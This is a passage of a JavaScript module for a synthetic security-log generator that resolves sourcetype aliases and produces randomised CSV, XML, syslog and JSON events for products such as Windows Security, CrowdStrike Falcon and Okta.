  'wineventlog:security':     'WinEventLog:Security',
  'syslog':                   'syslog',
  'syslog-rfc5424':           'syslog',
  'crowdstrike:falcon:event': 'crowdstrike:falcon:event',
  'crowdstrike-falcon':       'crowdstrike:falcon:event',
  'okta:system':              'okta:system',
  'okta-system-log':          'okta:system',
};

function resolveSourcetype(name) {
  if (SOURCETYPE_ALIASES[name]) return SOURCETYPE_ALIASES[name];
  const lower = name.toLowerCase();
  for (const key of Object.keys(SOURCETYPE_ALIASES)) {
    if (key.toLowerCase() === lower) return SOURCETYPE_ALIASES[key];
  }
  return null;
}

function loadDefinition(sourcetype) {
  // 1. Check detailed definitions first (these have full variant support)
  const canonical = resolveSourcetype(sourcetype);
  if (canonical && DEFINITIONS[canonical]) {
    return DEFINITIONS[canonical];
  }

  // 2. Check catalog (hydrate on demand)
  const catalogDef = getCatalogDefinition(sourcetype);
  if (catalogDef) {
    return catalogDef;
  }

  // 3. Case-insensitive catalog lookup
  const lower = sourcetype.toLowerCase();
  for (const key of Object.keys(CATALOG)) {
    if (key.toLowerCase() === lower) {
      return getCatalogDefinition(key);
    }
  }

  const allTypes = Object.keys(DEFINITIONS).concat(Object.keys(CATALOG));
  throw new Error(`Unknown sourcetype: "${sourcetype}". Available: ${allTypes.length} sourcetypes. Use listSourcetypes() to see all.`);
}


// ============================================================================
// GENERATOR ENGINE
// ============================================================================

class DataTapGenerator {
  constructor(options) {
    options = options || {};
    this.seed = options.seed !== undefined ? options.seed : undefined;
    this._eventCounter = 0;
  }

  generate(sourcetype, overrides) {
    overrides = overrides || {};
    const definition = loadDefinition(sourcetype);
    this._eventCounter++;

    const { variantKey, variant, mergedFieldDefs } = this._selectVariant(definition);
    const fields = this._generateAllFields(mergedFieldDefs, definition, variant, overrides);
    this._applyCalculatedFields(fields, definition);
    const raw = this._renderEvent(definition, variant, variantKey, fields);

    let timestamp = null;
    for (const fDef of mergedFieldDefs) {
      if (fDef.type === 'timestamp' && fields[fDef.name] !== undefined) {
        timestamp = fields[fDef.name];
        break;
      }
    }
    if (!timestamp) timestamp = new Date().toISOString();

    return { raw, fields, sourcetype: definition.sourcetype, timestamp };
  }

  // --- Variant selection ---

  _selectVariant(definition) {
    if (!definition.variants) {
      return { variantKey: null, variant: null, mergedFieldDefs: definition.fields || [] };
    }
    const variantKeys = Object.keys(definition.variants);
    const weights = variantKeys.map(k => definition.variants[k].weight || 1);
    const variantKey = weightedChoice(variantKeys, weights, this._getSeed());
    const variant = definition.variants[variantKey];
    const mergedFieldDefs = this._mergeFieldDefs(definition.fields || [], variant.fields || {});
    return { variantKey, variant, mergedFieldDefs };
  }

  _mergeFieldDefs(baseFields, variantFields) {
    const merged = baseFields.map(f => Object.assign({}, f));
    for (const [name, value] of Object.entries(variantFields)) {
      const existing = merged.find(f => f.name === name);
      if (typeof value === 'object' && value !== null && value.type) {
        if (existing) {
          Object.assign(existing, value);
        } else {
          merged.push(Object.assign({ name }, value));
        }
      } else {
        if (existing) {
          existing._staticValue = value;
        } else {
          merged.push({ name, type: 'static', _staticValue: value });
        }
      }
    }
    return merged;
  }

  // --- Field generation ---

  _generateAllFields(fieldDefs, definition, variant, overrides) {
    const fields = {};
    for (const fDef of fieldDefs) {
      const name = fDef.name;
      if (overrides[name] !== undefined) { fields[name] = overrides[name]; continue; }
      if (fDef._staticValue !== undefined) { fields[name] = fDef._staticValue; continue; }
      fields[name] = this._generateField(fDef, fields);
    }
    return fields;
  }

  _generateField(fieldDef, context) {
    const config = fieldDef.config || {};
    const seed = this._getSeed();

    switch (fieldDef.type) {
      case 'static':
        return fieldDef._staticValue !== undefined ? fieldDef._staticValue : '';

      case 'ip':
        return this._generateIP(config, seed);

      case 'port':
        return this._generatePort(config, seed);

      case 'enum':
        return this._generateEnum(config, seed);

      case 'int':
        return this._generateInt(config, seed);

      case 'float':
        return this._generateFloat(config, seed);

      case 'string':
        return this._generateString(config, seed);

      case 'timestamp':
        return this._generateTimestamp(config, seed);

      case 'uuid':
        return randomUUID(seed);

      case 'hash':
        return this._generateHash(config, seed);

      case 'hostname':
        return this._generateHostname(config, seed);

      case 'username':
        return this._generateUsername(config, seed);

      case 'email':
        return this._generateEmail(config, seed);

      case 'url':
        return this._generateURL(config, seed);

      case 'path':
        return this._generatePath(config, seed);

      case 'useragent':
        return randomUserAgent(seed);

      case 'serial':
        return proceduralSerial(config.prefix, config.digits, seed);

      case 'counter':
        return (config.prefix || '') + String(config.base ? config.base + this._eventCounter : this._eventCounter);

      case 'procedural_hostname':
        return proceduralHostname(seed);

      case 'procedural_name':
        return proceduralName(seed);

      case 'domain':
        return randomDomain(seed);

      default:
        if (config.pool && config.pool.length > 0) {
          return pickRandom(config.pool, seed);
        }
        return '';
    }
  }

  // --- Type-specific generators ---

  _generateIP(config, seed) {
    if (config.internal || config.external) {
      return randomIPv4Weighted(config, seed);
    }
    if (config.cidr) {
      return randomIPv4(config.cidr, seed);
    }
    return randomIPv4(undefined, seed);
  }

  _generatePort(config, seed) {
    if (config.common && config.weights) {
      return weightedChoice(config.common, config.weights, seed);
    }
    return randomPort(config.type, seed);
  }

  _generateEnum(config, seed) {
    if (!config.values || config.values.length === 0) return '';
    const weights = config.weights || config.values.map(() => 1);
    return weightedChoice(config.values, weights, seed);
  }

  _generateInt(config, seed) {
    const min = config.min !== undefined ? config.min : 0;
    const max = config.max !== undefined ? config.max : 65535;
    if (seed !== undefined) {
      return this._seededInt(seed, min, max);
    }
    return min + crypto.randomInt(max - min + 1);
  }

  _generateFloat(config, seed) {
    const min = config.min !== undefined ? config.min : 0;
    const max = config.max !== undefined ? config.max : 1;
    return randomFloat(min, max, seed);
  }

  _generateString(config, seed) {
    if (config.pool && config.pool.length > 0) {
      return pickRandom(config.pool, seed);
    }
    if (config.pattern) {
      return this._fillPattern(config.pattern, seed);
    }
    return '';
  }

  _generateTimestamp(config, seed) {
    const format = config.format || 'iso';
    const jitterMs = config.jitterMs || 0;
    const now = new Date();
    if (jitterMs > 0) {
      let offset;
      if (seed !== undefined) {
        offset = this._seededInt(seed, -jitterMs, jitterMs);
      } else {
        offset = crypto.randomInt(jitterMs * 2 + 1) - jitterMs;
      }
      now.setTime(now.getTime() + offset);
    }
    if (format === 'YYYY/MM/DD HH:mm:ss' || format === 'custom_pan') {
      return this._formatPANTimestamp(now);
    }
    return formatTimestamp(now, format);
  }

  _generateHash(config, seed) {
    switch (config.algorithm) {
      case 'sha256':  return randomSHA256(seed);
      case 'md5':     return randomMD5(seed);
      case 'random_hex': return randomHex(config.length || 32, seed);
      default:        return randomSHA256(seed);
    }
  }

  _generateHostname(config, seed) {
    if (config.pool && config.pool.length > 0) {
      return pickRandom(config.pool, seed);
    }
    return randomHostname(config.pattern || 'role-location-number', seed);
  }

  _generateUsername(config, seed) {
    if (config.pool && config.pool.length > 0) {
      return pickRandom(config.pool, seed);
    }
    let pattern = config.pattern || 'first.last';
    let username;
    if (pattern === '{first}.{last}' || pattern === 'first.last') {
      username = randomUsername('first.last', seed);
    } else if (pattern === '{First} {Last}') {
      const first = pickRandom(FIRST_NAMES, seed);
      const last = pickRandom(LAST_NAMES, seed !== undefined ? seed + 1 : undefined);
      username = `${first} ${last}`;
    } else if (pattern === '{firstinitial}.{last}' || pattern === 'firstinitial.last') {
      username = randomUsername('firstinitial.last', seed);
    } else {
      username = randomUsername('first.last', seed);
    }
    if (config.domain) {
      username = config.domain + username;
    }
    return username;
  }

  _generateEmail(config, seed) {
    let domain = null;
    if (config.domain) {
      domain = config.domain;
    } else if (config.domains && config.domains.length > 0) {
      domain = pickRandom(config.domains, seed);
    }
    return randomEmail(domain, seed);
  }

  _generateURL(config, seed) {
    const protocol = config.protocol || 'https';
    const domain = config.domain || randomDomain(seed);
    const paths = config.paths || ['/api/v1/data', '/login', '/dashboard', '/health', '/users', '/api/v1/auth/token', '/api/v1/events', '/metrics', '/status'];
    const urlPath = pickRandom(paths, seed !== undefined ? seed + 5 : undefined);
    return `${protocol}://${domain}${urlPath}`;
  }

  _generatePath(config, seed) {
    if (config.pool && config.pool.length > 0) {
      return pickRandom(config.pool, seed);
    }
    const basePaths = [
      'C:\\Windows\\System32\\cmd.exe', 'C:\\Windows\\System32\\powershell.exe',
      'C:\\Windows\\System32\\svchost.exe', 'C:\\Windows\\explorer.exe',
      '/usr/bin/bash', '/usr/bin/python3', '/usr/local/bin/node', '/usr/sbin/sshd',
    ];
    return pickRandom(basePaths, seed);
  }

  // --- Pattern filling ---

  _fillPattern(pattern, seed) {
    let result = pattern;
    let offset = 0;

    result = result.replace(/\{random_hex:(\d+)\}/g, (match, len) => {
      return randomHex(parseInt(len, 10), seed !== undefined ? seed + (offset++) : undefined);
    });

    result = result.replace(/\{random:(\d+)\}/g, (match, len) => {
      return this._randomAlphaNum(parseInt(len, 10), seed !== undefined ? seed + (offset++) : undefined);
    });

    result = result.replace(/\{first\}/gi, (match) => {
      const name = pickRandom(FIRST_NAMES, seed !== undefined ? seed + (offset++) : undefined);
      return match === '{First}' ? name : name.toLowerCase();
    });

    result = result.replace(/\{last\}/gi, (match) => {
      const name = pickRandom(LAST_NAMES, seed !== undefined ? seed + (offset++) : undefined);
      return match === '{Last}' ? name : name.toLowerCase();
    });

    return result;
  }

  // --- Calculated fields ---

  _applyCalculatedFields(fields, definition) {
    if (definition.priorityCalc && definition.priorityCalc === 'fac * 8 + sev') {
      const fac = typeof fields.fac === 'number' ? fields.fac : parseInt(fields.fac, 10) || 0;
      const sev = typeof fields.sev === 'number' ? fields.sev : parseInt(fields.sev, 10) || 0;
      fields.pri = fac * 8 + sev;
    }
  }

  // --- Event rendering ---

  _renderEvent(definition, variant, variantKey, fields) {
    const format = definition.format;
    switch (format) {
      case 'csv':            return this._renderCSV(definition, fields);
      case 'xml':            return this._renderXML(definition, variant, fields);
      case 'syslog_rfc5424': return this._renderSyslog(definition, variant, fields);
      case 'json':           return this._renderJSON(definition, variant, fields);
      // Catalog formats: syslog, kv, text, tsv — all use template rendering
      case 'syslog':
      case 'kv':
      case 'text':
      case 'tsv':
        return this._renderCatalogTemplate(definition, variant, fields);
      default:               return this._renderTemplate(definition.template || '', fields);
    }
  }

  _renderCSV(definition, fields) {
    return this._renderTemplate(definition.template, fields);
  }

  _renderXML(definition, variant, fields) {
    let xml = this._renderTemplate(definition.xmlHeader, fields);
    if (variant && variant.eventData) {
      xml += '<EventData>';
      for (const [dataName, dataTemplate] of variant.eventData) {
        const value = this._renderTemplate(dataTemplate, fields);
        xml += `<Data Name='${dataName}'>${value}</Data>`;
      }
      xml += '</EventData>';
    }
    xml += definition.xmlFooter;
    return xml;
  }

  _renderSyslog(definition, variant, fields) {
    if (variant && variant.template) {
      // Bug fix: render nested templates in the variant body (e.g. {{km}} which itself contains {{sip}})
      let rendered = this._renderTemplate(variant.template, fields);
      // Second pass to resolve any nested templates that were inside field values
      if (rendered.includes('{{')) {
        rendered = this._renderTemplate(rendered, fields);
      }
      return rendered;
    }
    // Fallback template: fill {{msg}} with a generated message if not in fields
    if (!fields.msg && definition.template && definition.template.includes('{{msg}}')) {
      fields.msg = this._generateFallbackMessage(definition, fields);
    }
    return this._renderTemplate(definition.template, fields);
  }

  // Render catalog-sourced events (syslog, kv, text, tsv formats from CATALOG)
  _renderCatalogTemplate(definition, variant, fields) {
    if (definition.template) {
      return this._renderTemplateWithFallback(definition.template, fields, definition);
    }
    return JSON.stringify(fields);
  }

  _renderJSON(definition, variant, fields) {
    // Okta-style: jsonBase + jsonMerge
    if (definition.jsonBase && variant && variant.jsonMerge) {
      return this._renderJSONMerge(definition, variant, fields);
    }
    // CrowdStrike-style: prefix + body + suffix
    if (definition.templatePrefix && variant && variant.bodyTemplate) {
      const prefix = this._renderTemplateJSON(definition.templatePrefix, fields);
      const body = this._renderTemplateJSON(variant.bodyTemplate, fields);
      const suffix = this._renderTemplateJSON(definition.templateSuffix || '', fields);
      return prefix + body + suffix;
    }
    if (definition.template && definition.template !== 'json_merge') {
      // For catalog JSON entries, render the template and fix quoting for numeric types
      return this._renderTemplateWithFallback(definition.template, fields, definition);
    }
    return JSON.stringify(fields);
  }

  _renderJSONMerge(definition, variant, fields) {
    const base = this._deepClone(definition.jsonBase);
    const merged = this._deepMerge(base, variant.jsonMerge);
    const resolved = this._resolveJSONTemplates(merged, fields);
    return JSON.stringify(resolved);
  }

  // --- Template rendering ---

  _renderTemplate(template, fields) {
    if (!template) return '';
    return template.replace(/\{\{(\w[\w.]*)\}\}/g, (match, key) => {
      if (fields[key] !== undefined) return String(fields[key]);
      const parts = key.split('.');
      let value = fields;
      for (const part of parts) {
        if (value && typeof value === 'object' && part in value) {
          value = value[part];
        } else {
          value = undefined;
          break;
        }
      }
      if (value !== undefined) return String(value);
      return match;
    });
  }

  // Bug fix #3: Render template with fallback for unknown placeholders
  _renderTemplateWithFallback(template, fields, definition) {
    if (!template) return '';
    const seed = this._getSeed();
    return template.replace(/\{\{(\w[\w.]*)\}\}/g, (match, key) => {
      if (fields[key] !== undefined) return String(fields[key]);
      const parts = key.split('.');
      let value = fields;
      for (const part of parts) {
        if (value && typeof value === 'object' && part in value) {
          value = value[part];
        } else {
          value = undefined;
          break;
        }
      }
      if (value !== undefined) return String(value);
      // Generate a reasonable default for unknown placeholders
      return this._generateDefaultForPlaceholder(key, seed);
    });
  }

  // Generate sensible defaults for unresolved template placeholders
  _generateDefaultForPlaceholder(key, seed) {
    const k = key.toLowerCase();
    // IP-like fields
    if (k.includes('ip') || k === 'exporter' || k === 'server_ip' || k === 'nas_ip' || k === 'lease_ip') return randomIPv4(undefined, seed);
    // Timestamp-like fields
    if (k === 'ts' || k.includes('time') || k.includes('date') || k === 'last_seen' || k === 'valid_from' || k === 'last_updated' || k === 'scan_date') return new Date().toISOString();
    // User-like fields
    if (k.includes('user') || k === 'owner' || k === 'caller' || k === 'reporter' || k === 'developer' || k === 'created_by') return randomUsername('first.last', seed);
    // Host-like fields
    if (k.includes('host') || k.includes('server') || k.includes('node') || k === 'appliance' || k === 'edge' || k === 'device' || k === 'vm' || k === 'container') return randomHostname('role-location-number', seed);
    // UUID-like fields
    if (k.includes('uuid') || k.includes('_id') || k === 'flow_id' || k === 'execution_id' || k === 'correlation_id' || k === 'trace_id' || k === 'span_id' || k === 'alert_id' || k === 'case_id' || k === 'study_uid') return randomUUID(seed);
    // Hash fields
    if (k.includes('sha256') || k === 'checksum') return randomSHA256(seed);
    if (k.includes('md5') || k === 'client_mac') return randomMD5(seed);
    // Email
    if (k.includes('email') || k === 'sender') return randomEmail(null, seed);
    // Domain/URL
    if (k.includes('domain') || k === 'query') return randomDomain(seed);
    if (k.includes('url') || k === 'permalink') return 'https://' + randomDomain(seed) + '/path';
    // User agent
    if (k === 'ua' || k.includes('user_agent')) return randomUserAgent(seed);
    // Port
    if (k.includes('port')) return randomPort('well-known', seed);
    // Numeric-ish
    if (k.includes('bytes') || k === 'size' || k === 'duration' || k === 'latency' || k === 'elapsed' || k === 'count') return randomIntInRange(100, 100000, seed);
    // Generic string fallbacks
    if (k.includes('path') || k === 'name') return '/data/' + randomAlphaNum(8, seed);
    if (k.includes('msg') || k.includes('message') || k === 'output' || k === 'result' || k === 'evidence') return 'event processed successfully';
    if (k.includes('rule') || k === 'policy' || k === 'scenario' || k === 'playbook' || k === 'workflow' || k === 'story' || k === 'flag' || k === 'project' || k === 'agent') return 'default-' + randomAlphaNum(6, seed);
    if (k.includes('title') || k.includes('subject') || k === 'alert' || k === 'signal' || k === 'finding' || k === 'indicator') return 'Alert-' + randomAlphaNum(8, seed);
    if (k.includes('resource') || k === 'entity' || k === 'object' || k === 'target' || k === 'source' || k === 'image') return 'resource-' + randomAlphaNum(8, seed);
    // Network
    if (k === 'proto' || k === 'protocol') return pickRandom(['tcp', 'udp'], seed);
    // Catch-all
    return randomAlphaNum(12, seed);
  }

  // Generate a fallback message for syslog {{msg}} when no variant was selected
  _generateFallbackMessage(definition, fields) {
    const messages = [
      'process started successfully',
      'health check passed',
      'connection established',
      'configuration reloaded',
      'service ready',
      'background task completed',
    ];
    return pickRandom(messages, this._getSeed());
  }

  _renderTemplateJSON(template, fields) {
    if (!template) return '';
    return template.replace(/\{\{(\w[\w.]*)\}\}/g, (match, key) => {
      let value;
      if (fields[key] !== undefined) {
        value = fields[key];
      } else {
        const parts = key.split('.');
        value = fields;
        for (const part of parts) {
          if (value && typeof value === 'object' && part in value) {
            value = value[part];
          } else {
            value = undefined;
            break;
          }
        }
      }
      if (value === undefined) return match;
      if (typeof value === 'number' || typeof value === 'boolean') return String(value);
      return this._jsonEscapeString(String(value));
    });
  }

  _jsonEscapeString(str) {
    return str
      .replace(/\\/g, '\\\\')
      .replace(/"/g, '\\"')
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r')
      .replace(/\t/g, '\\t');
  }

  _resolveJSONTemplates(obj, fields) {
    if (typeof obj === 'string') {
      const singleMatch = obj.match(/^\{\{(\w[\w.]*)\}\}$/);
      if (singleMatch) {
        const key = singleMatch[1];
        if (fields[key] !== undefined) return fields[key];
      }
      return this._renderTemplate(obj, fields);
    }
    if (Array.isArray(obj)) {
      return obj.map(item => this._resolveJSONTemplates(item, fields));
    }
    if (obj !== null && typeof obj === 'object') {
      const result = {};
      for (const [key, value] of Object.entries(obj)) {
        result[key] = this._resolveJSONTemplates(value, fields);
      }
      return result;
    }
    return obj;
  }

  // --- Utility methods ---

  _getSeed() {
    if (this.seed !== undefined) {
      return this.seed + this._eventCounter;
    }
    return undefined;
  }

  _seededInt(seed, min, max) {
    const s = ((seed * 1664525 + 1013904223) & 0x7fffffff);
    return min + (s % (max - min + 1));
  }

  _formatPANTimestamp(date) {
    const y = date.getFullYear();
    const mo = String(date.getMonth() + 1).padStart(2, '0');
    const d = String(date.getDate()).padStart(2, '0');
    const h = String(date.getHours()).padStart(2, '0');
    const mi = String(date.getMinutes()).padStart(2, '0');
    const s = String(date.getSeconds()).padStart(2, '0');
    return `${y}/${mo}/${d} ${h}:${mi}:${s}`;
  }

  _randomHex(length, seed) {
    return randomHex(length, seed);
  }

  _randomAlphaNum(length, seed) {
    return randomAlphaNum(length, seed);
  }

  _deepClone(obj) {
    if (obj === null || typeof obj !== 'object') return obj;
    if (Array.isArray(obj)) return obj.map(item => this._deepClone(item));
    const result = {};
    for (const [key, value] of Object.entries(obj)) {
      result[key] = this._deepClone(value);
    }
    return result;
  }

  _deepMerge(target, source) {
    if (source === null || typeof source !== 'object') return source;
    if (Array.isArray(source)) return this._deepClone(source);
    const result = this._deepClone(target && typeof target === 'object' ? target : {});
    for (const [key, value] of Object.entries(source)) {
      if (value !== null && typeof value === 'object' && !Array.isArray(value)
          && result[key] && typeof result[key] === 'object' && !Array.isArray(result[key])) {
        result[key] = this._deepMerge(result[key], value);
      } else {
        result[key] = this._deepClone(value);
      }
    }
    return result;
  }
}


// ============================================================================
// PUBLIC API
// ============================================================================

// Shared generator instance (stateless per-call, counter for seed diversity)
const _generator = new DataTapGenerator();

module.exports = {
  /**
   * Generate a single event for the given sourcetype.
   *
   * @param {string} sourcetype - e.g. "pan:traffic", "syslog", "cisco:asa", "aws:inspector"
   * @param {object} [overrides] - Optional field overrides
   * @returns {{ raw: string, fields: object, sourcetype: string, timestamp: string }}
   */
  generate(sourcetype, overrides) {
    return _generator.generate(sourcetype, overrides);
  },

  /**
   * List all available sourcetypes (detailed + catalog).
   * @returns {string[]}
   */
  listSourcetypes() {
    const detailed = Object.keys(DEFINITIONS);
    const catalog = Object.keys(CATALOG);
    // Merge, dedup (catalog may overlap with detailed), maintain order
    const seen = new Set(detailed);
    const all = [...detailed];
    for (const st of catalog) {
      if (!seen.has(st)) {
        seen.add(st);
        all.push(st);
      }
    }
    return all;
  },

  /**
   * Create a new generator instance with options (e.g. seed for deterministic output).
   * @param {object} [options]
   * @returns {DataTapGenerator}
   */
  createGenerator(options) {
    return new DataTapGenerator(options);
  },

  /**
   * Get the version of the bundled engine.
   * @returns {string}
   */
  version: '0.2.0',
};
